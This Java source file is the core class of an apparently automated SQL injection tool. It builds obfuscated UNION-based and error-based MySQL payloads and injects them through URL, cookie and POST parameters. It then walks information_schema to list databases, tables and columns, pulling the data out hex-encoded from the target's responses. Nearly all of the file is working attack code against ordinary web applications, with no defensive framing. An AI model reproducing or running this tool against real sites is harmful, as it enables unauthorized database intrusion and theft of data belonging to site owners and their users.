package core;

import base.*;
import errors.BrowserException;
import form.BROWindow;
import java.io.File;
import java.util.ArrayList;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import struct.*;
import struct.SqlTest;

public class SqlInj {
    
    public int type = 0;
    public ArrayList<Integer> validColumns;
    public String quote = "";
    public int columns = 0;
    public SqlTest sql;
    public String sql_inj;
    public int valid_column;
    public ArrayList dbs = new ArrayList();
    protected String union = "/*!uNIoN*/";
    protected String select = "/*!SelEcT*/";
    protected String error_based = "AND+(" + select + "+8041+FROM(" + select + "+COUNT(*),CONCAT((%SELECT%),floor(rand(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)";
    public String db = "";
    public String user = "";
    public String dbver = "";
    public boolean file_priv = false;
    protected boolean hasSqlError = false;
    //***analyze***//
    protected String htmlValid;
    protected Boolean fastErr = null;
    protected int browserFollow = 3;
    
    public boolean getHtmlError(String html) {
        if (html.indexOf("You have an error in your SQL syntax") != -1) {
            //this.type = 1;
            return true;
        }
        if (Pattern.matches(".*?Unknown column '\\d+' in 'order clause'.*?", html)) {
            //this.type = 1;
            return true;
        }
        
        if (Pattern.matches(".*?mysql_num_rows.*?", html)) {
            return true;
        }
        if (Pattern.matches(".*?mysql_fetch_.*?", html)) {
            return true;
        }
        
        return false;
    }
    
    public boolean checkError(String validhtml, String html1, String html2) {
        int normalLen = validhtml.length();
        int len1 = html1.length();
        int len2 = html2.length();
        
        double per1 = 100 * (((double) len1 - (double) normalLen)) / normalLen;
        double per2 = 100 * (((double) len2 - (double) normalLen)) / normalLen;
        if (this.getHtmlError(html1)) {
            return false;
        }
        if (this.getHtmlError(html2) && !this.getHtmlError(html1)) {
            return true;
        }
        
        if ((Math.abs(per1) < 2) && (Math.abs(per2) > 4.5)) {
            return true;
        }
        
        return false;
    }
    
    private String hexData(String data) {
        if ((data.indexOf("()") == -1) && (data.indexOf("count(") == -1) && (data.indexOf("cast(") == -1)) {
            data = "hEx(cast(" + data + "+as+char+CHARACTER+SET+utf8))";
        }
        return data;
    }
    
    public String getDataColumn(String data, boolean noConcat) {
        String res = "";
        int valid = valid_column;
        data = hexData(data);
        for (int i = 1; i <= this.columns; i++) {
            if (i > 1) {
                res += ",";
            }
            
            if (!(i == valid)) {
                res += '1';
            } else {
                if (noConcat) {
                    res += data;
                } else {
                    res += "concat(0x3a3a3a," + data + ",0x3a3a3a)";
                }
            }
            
        }
        
        return res;
    }
    
    public String getDataColumn(String data) {
        return this.getDataColumn(data, false);
    }
    
    public String getDataColumn2(String data1, String data2) {
        String res = "";
        int valid1 = validColumns.get(0);
        int valid2 = validColumns.get(1);
        data1 = hexData(data1);
        data2 = hexData(data2);
        
        for (int i = 1; i <= this.columns; i++) {
            if (i > 1) {
                res += ",";
            }
            
            if (i == valid1) {
                res += "concat(0x3a3a3a," + data1 + ",0x3a3a3a)";
                continue;
            }
            
            if (i == valid2) {
                res += "concat(0x3d3a3d," + data2 + ",0x3d3a3d)";
                continue;
            }
            
            res += '1';
            
        }
        
        return res;
    }
    
    public String getDataColumn3(String data1, String data2, String data3) {
        String res = "";
        int valid1 = validColumns.get(0);
        int valid2 = validColumns.get(1);
        int valid3 = validColumns.get(2);
        data1 = hexData(data1);
        data2 = hexData(data2);
        data3 = hexData(data3);
        
        for (int i = 1; i <= this.columns; i++) {
            if (i > 1) {
                res += ",";
            }
            
            if (i == valid1) {
                res += "concat(0x3a3a3a," + data1 + ",0x3a3a3a)";
                continue;
            }
            
            if (i == valid2) {
                res += "concat(0x3d3a3d," + data2 + ",0x3d3a3d)";
                continue;
            }
            
            if (i == valid3) {
                res += "concat(0x3a3d3a," + data3 + ",0x3a3d3a)";
                continue;
            }
            
            res += '1';
            
        }
        
        return res;
    }
    
    public String getDataColumnN(ArrayList<String> list) {
        if (list.size() == 3) {
            return this.getDataColumn3(list.get(0), list.get(1), list.get(2));
        }
        
        if (list.size() == 2) {
            return this.getDataColumn2(list.get(0), list.get(1));
        }
        
        return this.getDataColumn(list.get(0));
    }
    
    public String[] readDataColumnN(String html, int cols) {
        try {
            if (cols == 3) {
                return this.readDataColumn3(html);
            }
            if (cols == 2) {
                return this.readDataColumn2(html);
            }
            String[] r = new String[1];
            r[0] = this.readDataColumn(html);
            if (this.hasSqlError) {
                return null;
            }
            return r;
        } catch (Exception ex) {
            return null;
        }
    }
    
    public String getSqlString(String data, String conditions) {
        String res = "";
        String columns = "";
        if (this.type == 0) {
            columns = this.getDataColumn(data);
            res = Helper.replace(sql_inj, "%Inject_Here%", "-1" + this.quote + "+" + union + "+" + "(" + select + "+" + columns + "+" + conditions + ")+--+;");
            //res = sql_inj.replaceAll("%Inject_Here%", "-1" + this.quote + "+uNiOn+(sElEct+" + columns + "+" + conditions + ")+--+;");
        } else if (this.type == 1) {
            if ((data.indexOf("()") == -1) && (data.indexOf("count(") == -1)) {
                data = "hEx(cast(" + data + "+as+char+CHARACTER+SET+utf8))";
            }
            
            columns = Helper.replace(error_based, "%SELECT%", select + "+concat(0x3a3a3a," + data + ",0x3a3a3a)+" + conditions);
            res = sql_inj.replaceAll("%Inject_Here%\\+--\\+;", "%Inject_Here%");
            res = Helper.replace(res, "%Inject_Here%", "-1" + this.quote + "+" + columns);
            //res = res.replaceAll("%Inject_Here%", "-1" + this.quote + "+" + columns);

        }
        return res;
    }
    
    public String getSqlStringN(ArrayList<String> data, String conditions) {
        String res = "";
        String columns;
        if (this.type % 2 == 0) {
            columns = this.getDataColumnN(data);
            res = Helper.replace(sql_inj, "%Inject_Here%", ("-1" + this.quote + "+" + union + "+(" + select + "+" + columns + "+" + conditions + ")+--+;"));
        } else if (this.type % 2 == 1) {
            String elem = data.get(0);
            elem = this.hexData(elem);
            //if ((elem.indexOf("()") == -1) && (elem.indexOf("count(") == -1)) {
            //    elem = "hEx(cast(" + elem + "+as+char+CHARACTER+SET+utf8))";
            //}
            elem = "substring(" + elem + ",1,56)";
            columns = Helper.replace(error_based, "%SELECT%", select + "+concat(0x3a3a3a," + elem + ",0x3a3a3a)+" + conditions);
            res = sql_inj.replaceAll("%Inject_Here%\\+--\\+;", "%Inject_Here%");
            res = Helper.replace(res, "%Inject_Here%", "-1" + this.quote + "+" + columns);
        }
        return res;
    }
    
    public String[] queryData(ArrayList<String> data, String conditions) {
        String html;
        if (this.type < 2) {
            String testurl = this.getSqlStringN(data, conditions);
            Browser br = new Browser();
            try {
                html = br.getHTML(testurl);
            } catch (Exception ex) {
                return null;
            }
            String[] res = this.readDataColumnN(html, data.size());
            return res;
        }
        
        if ((this.type == 2) || (this.type == 3)) {
            String testurl = sql.url;
            Browser br = new Browser();
            br.specifyCookie = this.getSqlCookie(data, conditions);
            try {
                html = br.getHTML(testurl);
            } catch (Exception ex) {
                return null;
            }
            String[] res = this.readDataColumnN(html, data.size());
            return res;
        }
        
        if ((this.type == 4) || (this.type == 5)) {
            String testurl = sql.url;
            Browser br = new Browser();
            String post = this.getSqlPost(data, conditions);
            try {
                html = br.excludePost(testurl, post);
            } catch (Exception ex) {
                return null;
            }
            String[] res = this.readDataColumnN(html, data.size());
            return res;
        }
        
        return null;
    }
    
    public String queryData(String data, String conditions) {
        ArrayList<String> q = new ArrayList();
        q.add(data);
        String[] elems = this.queryData(q, conditions);
        if ((elems == null) || (elems.length < 1)) {
            return "";
        }
        
        return elems[0];
    }
    
    public String queryUnhexData(String data, String conditions) {
        ArrayList<String> q = new ArrayList();
        q.add(data);
        String[] elems = this.queryData(q, conditions);
        if ((elems == null) || (elems.length < 1)) {
            return "";
        }
        
        return Hex.unhex(elems[0]);
    }
    
    public String[] readUrlN(ArrayList<String> params, String condition, Boolean fullErrorBased) throws BrowserException {
        Browser br = new Browser();
        String html, testurl = "";
        String post = this.sql.poststr;
        testurl = this.sql.url;
        
        if (this.type == 2) {
            br.specifyCookie = this.getSqlCookie(params, condition);
            try {
                html = br.getHTML(sql.url);
            } catch (Exception ex) {
                return null;
            }
            String[] res = this.readDataColumnN(html, params.size());
            return res;
        }
        
        if ((this.type == 0) || (this.type == 1)) {
            testurl = this.getSqlStringN(params, condition);
        } else if ((this.type == 2) || (this.type == 3)) {
            testurl = sql.url;
            br.specifyCookie = this.getSqlStringN(params, condition);
        }
        
        if (this.type > 3) {
            post = this.getSqlPost(params, condition);
        }
        
        try {
            html = br.excludePost(testurl, post);
        } catch (BrowserException ex) {
            throw ex;
        } catch (Exception ex) {
            return null;
        }
        
        String[] temp = this.readDataColumnN(html, params.size());
        if (fullErrorBased) {
            if ((params.size() == 1) && (this.type % 2 == 1) && (temp != null)) {
                String testbase;// = testurl;
                if (this.type == 1) {
                    testbase = testurl;
                } else {
                    testbase = br.specifyCookie;
                }
                
                for (int i = 1; i < 999; i++) {
                    int start = i * 56 + 1;
                    int finish = i * 56 + 56;
                    if (temp[0].length() >= 28 * i) {
                        if (this.type == 1) {
                            testurl = testbase.replaceAll(",1,56", "," + start + "," + 56);
                        } else {
                            br.specifyCookie = testbase.replaceAll(",1,56", "," + start + "," + 56);
                        }
                        
                        try {
                            html = br.getHTML(testurl);
                        } catch (Exception ex) {
                            return temp;
                        }
                        String[] temp0 = this.readDataColumnN(html, params.size());
                        temp[0] += temp0[0];
                    } else {
                        break;
                    }
                }
            }
        }
        return temp;
    }
    
    public String[] readUrlN(ArrayList<String> params, String condition) throws BrowserException {
        return this.readUrlN(params, condition, false);
    }
    
    public String readDataColumn(String html) {
        this.hasSqlError = false;
        Pattern p = Pattern.compile(":::(.*?):::");
        Matcher m = p.matcher(html);
        if (!m.find()) {
            if (html.indexOf(":::") < 0) {
                this.hasSqlError = true;
            }
            return "";
        }
        String data = m.group(1);
        if (data.isEmpty()) {
            if (html.indexOf(":::") < 0) {
                this.hasSqlError = true;
            }
        }

        //Helper.write(html+data+"\r\n\r\n\r\n\r\n\r\n\r\n");
        return data;
    }
    
    public String[] readDataColumn2(String html) {
        String[] res = new String[2];
        this.hasSqlError = false;
        Pattern p = Pattern.compile(":::(.*?):::");
        Matcher m = p.matcher(html);
        if (!m.find()) {
            if (html.indexOf(":::") < 0) {
                this.hasSqlError = true;
            }
            res[0] = "";
        }
        String data = m.group(1);
        if (data.isEmpty()) {
            if (html.indexOf(":::") < 0) {
                this.hasSqlError = true;
            }
        };

        //Helper.write(html+data+"\r\n\r\n\r\n\r\n\r\n\r\n");
        res[0] = data;
        
        p = Pattern.compile("=:=(.*?)=:=");
        m = p.matcher(html);
        if (!m.find()) {
            if (html.indexOf("=:=") < 0) {
                this.hasSqlError = true;
            }
            res[1] = "";
        }
        data = m.group(1);
        if (data.isEmpty()) {
            if (html.indexOf("=:=") < 0) {
                this.hasSqlError = true;
            }
        };
        
        res[1] = data;
        return res;
    }
    
    public String[] readDataColumn3(String html) {
        String[] res = new String[3];
        this.hasSqlError = false;
        Pattern p = Pattern.compile(":::(.*?):::");
        Matcher m = p.matcher(html);
        if (!m.find()) {
            if (html.indexOf(":::") < 0) {
                this.hasSqlError = true;
            }
            res[0] = "";
        }
        String data = m.group(1);
        if (data.isEmpty()) {
            if (html.indexOf(":::") < 0) {
                this.hasSqlError = true;
            }
        };

        //Helper.write(html+data+"\r\n\r\n\r\n\r\n\r\n\r\n");
        res[0] = data;
        
        p = Pattern.compile("=:=(.*?)=:=");
        m = p.matcher(html);
        if (!m.find()) {
            if (html.indexOf("=:=") < 0) {
                this.hasSqlError = true;
            }
            res[1] = "";
        }
        data = m.group(1);
        if (data.isEmpty()) {
            if (html.indexOf("=:=") < 0) {
                this.hasSqlError = true;
            }
        };
        
        res[1] = data;
        
        p = Pattern.compile(":=:(.*?):=:");
        m = p.matcher(html);
        if (!m.find()) {
            if (html.indexOf(":=:") < 0) {
                this.hasSqlError = true;
            }
            res[1] = "";
        }
        data = m.group(1);
        if (data.isEmpty()) {
            if (html.indexOf(":=:") < 0) {
                this.hasSqlError = true;
            }
        };
        
        res[2] = data;
        return res;
    }
    
    public String concatColumns(ArrayList<String> clist) {
        String cstr = "";
        for (int i = 0; i < clist.size(); i++) {
            if (i > 0) {
                cstr += ",0x3b,";
            }
            String elem = clist.get(i);
            elem = this.hexData(elem);
            cstr += elem;
        }
        
        String data = "concAT(0x3a3a3a3d," + cstr + ",0x3d3a3a3a)";
        return data;
    }
    
    public String[] readConcat(String html, int cols) {
        Pattern p = Pattern.compile(":::(.*?):::");
        Matcher m = p.matcher(html);
        if (!m.find()) {
            if (html.indexOf(":::") < 0) {
                this.hasSqlError = true;
            }
            return null;
        }
        
        String data = m.group(1);
        if ((data.charAt(0) != '=') || (data.charAt(data.length() - 1) != '=')) {
            return null;
        }
        
        data = data.substring(1, data.length() - 1);
        String[] res = data.split(";", -1);
        if (res.length < cols) {
            return null;
        }
        
        for (int i = 0; i < res.length; i++) {
            res[i] = Hex.unhex(res[i]);
        }
        return res;
    }
    
    protected String getSqlCookie(ArrayList<String> data, String conditions) {
        if (this.type == 2) {
            String cookiestr = (sql).cookiestr;
            String columns = this.getDataColumnN(data);
            return Helper.replace(cookiestr, "%Inject_Here%", "-1" + this.quote + "+uNiOn+(sElEct+" + columns + "+" + conditions + ")+--+;");
        }
        
        if (this.type == 3) {
            String cookiestr = (sql).cookiestr;
            String elem = data.get(0);
            elem = this.hexData(elem);
            
            String columns = Helper.replace(this.error_based, "%SELECT%", "sElEct+concat(0x3a3a3a,substring(" + elem + ",1,56),0x3a3a3a)+" + conditions);
            //columns = this.error_based.replaceAll("%SELECT%", "sElEct+concat(0x3a3a3a3a3a," + data + ",0x3a3a3a3a3a)+" + conditions);
            return Helper.replace(cookiestr, "%Inject_Here%", ("-1" + this.quote + "+" + columns));
        }
        return null;
    }
    
    protected String getSqlCookie(String data, String conditions) {
        ArrayList<String> dd = new ArrayList();
        dd.add(data);
        return this.getSqlCookie(dd, conditions);
    }
    
    protected String getSqlPost(ArrayList<String> data, String conditions) {
        if (this.type == 4) {
            String poststr = (sql).poststr;
            String columns = this.getDataColumnN(data);
            return Helper.replace(poststr, "%Inject_Here%", "-1" + this.quote + "+uNiOn+(sElEct+" + columns + "+" + conditions + ")+--+;");
        }
        
        if (this.type == 5) {
            String poststr = (sql).poststr;
            String elem = data.get(0);
            elem = this.hexData(elem);
            
            String columns = Helper.replace(this.error_based, "%SELECT%", "sElEct+concat(0x3a3a3a,substring(" + elem + ",1,56),0x3a3a3a)+" + conditions);
            //columns = this.error_based.replaceAll("%SELECT%", "sElEct+concat(0x3a3a3a3a3a," + data + ",0x3a3a3a3a3a)+" + conditions);
            return Helper.replace(poststr, "%Inject_Here%", ("-1" + this.quote + "+" + columns));
        }
        return null;
    }
    
    protected String getSqlPost(String data, String conditions) {
        ArrayList<String> dd = new ArrayList();
        dd.add(data);
        return this.getSqlPost(dd, conditions);
    }
    
    public String getDB() throws BrowserException {
        if (!this.db.isEmpty()) {
            return this.db;
        }
        String db = this.queryData("database()", "");
        this.db = db;
        return db;
    }
    
    public ArrayList getTables(String db) throws BrowserException {
        ArrayList res = new ArrayList();
        Hex hex = new Hex();
        db = hex.formatHex(db);
        //String testurl = this.getSqlString("count(*)", "fRom+information_schema.TABLES+where+TABLE_SCHEMA=" + db);
        Browser br = new Browser();
        String data = this.queryData("count(*)", "fRom+information_schema.TABLES+where+TABLE_SCHEMA=" + db);
        //String data = this.readDataColumn(html);
        int sizetables = Helper.getInt(data, -1);
        
        if (sizetables == -1) {
            Helper.log(Lang.get("tables_count_error"));
            return res;
        }
        
        Helper.log(Lang.get("tables_count", sizetables));
        
        for (int i = 0; i < sizetables; i++) {
            //testurl = this.getSqlString("TABLE_NAME", "fRom+information_schema.TABLES+where+TABLE_SCHEMA=" + db + "+order+by+TABLE_NAME+limit+" + i + ",1");
            data = this.queryData("TABLE_NAME", "fRom+information_schema.TABLES+where+TABLE_SCHEMA=" + db + "+order+by+TABLE_NAME+limit+" + i + ",1");
            //data =this.queryData("count(*)", "fRom+information_schema.TABLES+where+TABLE_SCHEMA=" + db);
            String table = Hex.unhex(data);
            BROWindow.tables_list.add(table);
            res.add(table);
        }
        return res;
    }
    
    public ArrayList<String> getDBs() throws BrowserException {
        ArrayList<String> res = new ArrayList();
        String data = this.queryData("count(DISTINCT+SCHEMA_NAME)", "fRom+information_schema.SCHEMATA");
        int sizetables = Helper.getInt(data, -1);
        
        if (sizetables == -1) {
            Helper.log(Lang.get("db_count_error"));
            return res;
        }
        
        Helper.log(Lang.get("db_count", sizetables));
        
        for (int i = 0; i < sizetables; i++) {
            data = this.queryData("SCHEMA_NAME", "fRom+information_schema.SCHEMATA+order+by+SCHEMA_NAME+limit+" + i + ",1");
            String basa = Hex.unhex(data);
            if (!basa.equals(db)) {
                BROWindow.db_list.add(basa);
            }
            res.add(basa);
        }
        this.dbs = res;
        return res;
    }
    
    public ArrayList<String> getTableFields(String table, String db) throws BrowserException {
        ArrayList<String> res = new ArrayList();
        Hex hex = new Hex();
        //String db=this.db;
        int ind = BROWindow.getFieldsIndex;
        db = hex.formatHex(db);
        table = hex.formatHex(table);
        String data = this.queryData("count(DISTINCT+COLUMN_NAME)", "fRom+information_schema.COLUMNS+where+TABLE_SCHEMA=" + db + "+AND+TABLE_NAME=" + table);
        
        int sizecolumns = Helper.getInt(data, -1);
        if (sizecolumns == -1) {
            Helper.log(Lang.get("column_count_error", table));
            return res;
        }
        
        Helper.log(Lang.get("column_count", sizecolumns));//"Количество колонок: " + );

        for (int i = 0; i < sizecolumns; i++) {
            data = this.queryData("COLUMN_NAME", "fRom+information_schema.COLUMNS+where+TABLE_SCHEMA=" + db + "+AND+TABLE_NAME=" + table + "+order+by+ORDINAL_POSITION+limit+" + i + ",1");
            String column_name = Hex.unhex(data);
            BROWindow.tables_list.add("  " + column_name, ind + 1 + i);
            res.add(column_name);
        }
        return res;
    }
    
    public ArrayList getTableFields(String table) throws BrowserException {
        return this.getTableFields(table, this.db);
    }
    
    public boolean checkPageValid(String validhtml, String html) {
        int normalLen = validhtml.length();
        int len = html.length();
        
        double per = 100 * (((double) len - (double) normalLen)) / normalLen;
        if (this.getHtmlError(html)) {
            return false;
        }
        
        if ((Math.abs(per) < 2)) {
            return true;
        }
        
        return false;
    }
    
    protected String getTestColumn(int len) {
        String res = "";
        for (int i = 1; i <= len; i++) {
            if (i > 1) {
                res += ",";
            }
            int ost = i % 10;
            int chastnoe = i / 10;
            String column = (ost * 11111111 + chastnoe * 100000000) + "*137";
            res += column;
        }
        
        return res;
        
    }
    
    protected ArrayList<Integer> getValidColumns(String html, int len) {
        ArrayList res = new ArrayList();
        for (int i = len; i >= 1; i--) {
            long ost = i % 10;
            long chastnoe = i / 10;
            String column = (ost * 11111111 + chastnoe * 100000000) * 137 + "";
            if (html.indexOf(column) != -1) {
                res.add(i);
            }
            html = html.replaceAll(column, "<tested>");
        }
        
        return res;
    }
    
}
